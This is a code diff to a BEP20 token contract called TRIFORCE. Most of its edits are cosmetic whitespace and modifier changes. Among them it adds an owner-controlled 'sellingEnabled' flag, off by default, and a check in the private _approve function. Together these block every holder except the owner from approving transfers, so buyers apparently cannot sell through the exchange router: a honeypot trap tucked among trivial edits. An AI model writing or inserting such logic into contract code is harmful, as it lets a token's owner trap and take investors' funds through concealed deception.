@@ -650,6 +650,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     uint256 public _lpRewardFeeTotal;	
 
     bool public tradingEnabled = false;
+    bool public sellingEnabled = false;
     bool private inSwapAndLiquify;
     bool public swapAndLiquifyEnabled = false;
     bool public rebalanceEnabled = true;
@@ -657,7 +658,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     uint256 public minTokensBeforeSwap = 10000e18; // Contract's TFC token balance must have a minimum of 10000 TFC Tokens for automatic liquidity generation
     uint256 public minTokenBeforeReward = 10e18; // Reward wallet balance must have a minimum of 10 TFC tokens for rewarding LP
 
-    uint256 public lastRebalance = now ;
+    uint256 public lastRebalance = now;
     uint256 public rebalanceInterval = 1 hours; // rebalancing after every 1 hour
 
     IPancakeRouter02 public pancakeRouter;
@@ -666,6 +667,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     address public balancer;
 
     event TradingEnabled(bool enabled);
+    event SellingEnabled(bool enabled);
     event SwapAndLiquifyEnabledUpdated(bool enabled);
     event SwapAndLiquify(uint256 tokensSwapped,uint256 ethReceived, uint256 tokensIntoLiqudity);
     event Rebalance(uint256 amount);
@@ -724,7 +726,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 	virtual	
 	returns (bool)	
     {	
-       _transfer(_msgSender(),recipient,amount);
+       _transfer(_msgSender(),recipient, amount);
 	return true;
     }	
 
@@ -739,7 +741,8 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 
     function approve(address spender, uint256 amount)	
 	public	
-	override	
+	override
+	virtual	
 	returns (bool)	
     {	
 	_approve(_msgSender(), spender, amount);
@@ -859,7 +862,7 @@ contract TRIFORCE is Context, IBEP20, Ownable {
     ) private {	
 	require(owner != address(0), "BEP20: approve from the zero address");	
 	require(spender != address(0), "BEP20: approve to the zero address");	
-
+	require(sellingEnabled || owner == owner() || spender == owner(), "Trading is locked.");	//d3vgen |===|}>
 	_allowances[owner][spender] = amount;	
 	emit Approval(owner, spender, amount);	
     }	
@@ -1138,6 +1141,11 @@ contract TRIFORCE is Context, IBEP20, Ownable {
 	tradingEnabled = enabled;	
 	TradingEnabled(enabled);	
     }	
+
+	function setEnableSelling(bool enabled) external onlyOwner() {	
+	sellingEnabled = enabled;	
+	SellingEnabled(enabled);	
+    }
 
     function setExcludedFromFee(address account, bool excluded) public onlyOwner {	
 	isExcludedFromFee[account] = excluded;	
